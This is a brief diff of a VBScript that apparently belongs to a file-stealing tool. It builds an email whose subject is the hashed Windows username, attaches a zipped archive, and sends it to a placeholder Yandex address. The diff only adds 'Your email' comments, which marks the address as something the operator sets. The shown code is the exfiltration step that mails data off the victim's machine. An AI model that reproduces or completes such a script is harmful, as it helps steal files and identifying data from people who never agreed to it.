@@ -23,8 +23,8 @@ Set fs = CreateObject("Scripting.FileSystemObject"):
 username   = ws.ExpandEnvironmentStrings("%username%"):
 
 e.Subject  = SHA1(username):
-e.From     = "<example@yandex.com>":
-e.To       = "<example@yandex.com>":
+e.From     = "<example@yandex.com>": 'Your email
+e.To       = "<example@yandex.com>": 'Your email
 e.TextBody = "":
 e.AddAttachment THE_PATH_TO_THE_ZIPPED_ARCHIVE:
 
